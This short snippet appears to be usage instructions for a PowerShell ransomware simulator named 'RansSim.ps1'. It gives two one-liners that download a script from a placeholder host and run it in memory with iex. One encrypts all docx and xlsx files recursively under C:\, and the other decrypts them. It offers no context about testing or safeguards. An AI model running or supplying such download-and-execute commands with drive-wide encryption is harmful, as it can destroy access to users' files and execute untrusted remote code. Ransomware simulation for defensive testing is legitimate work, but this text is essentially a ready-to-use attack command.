# Encrypt
`iex ((New-Object Net.WebClient).DownloadString('https://link.com/RansSim.ps1')) -Path 'C:\' -Extension 'docx','xlsx' -Recurse`

# Decrypt
`iex ((New-Object Net.WebClient).DownloadString('https://link.com/RansSim.ps1')) -Path 'C:\' -Recurse -Decrypt`

Make sure to replace link and path.